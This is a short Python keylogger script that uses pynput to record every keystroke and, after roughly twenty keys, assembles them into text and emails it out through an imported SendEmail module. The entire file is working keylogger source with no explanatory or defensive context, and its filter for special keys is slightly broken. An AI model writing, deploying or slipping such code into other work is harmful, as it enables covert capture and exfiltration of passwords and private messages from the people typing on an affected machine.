import pynput
from pynput.keyboard import Key,Listener
import SendEmail

count=0
keys=[]

def onPress(key):
    print(key,"pressed")
    global keys,count
    keys.append(str(key))
    count+=1
    if count>20:
        count=0
        email(keys)

def email(keys):
    message=""
    for i in keys:
        key=i.replace("'","")
        if i=="Key.space":
            key=" "
        elif i.find("Key")>0:
            key=""
        message+=key
    print(message)
    SendEmail.send_email(message)

def onRelease(key):
    if key==Key.esc:
        return False

with Listener(on_press=onPress,on_release=onRelease) as x:
    x.join()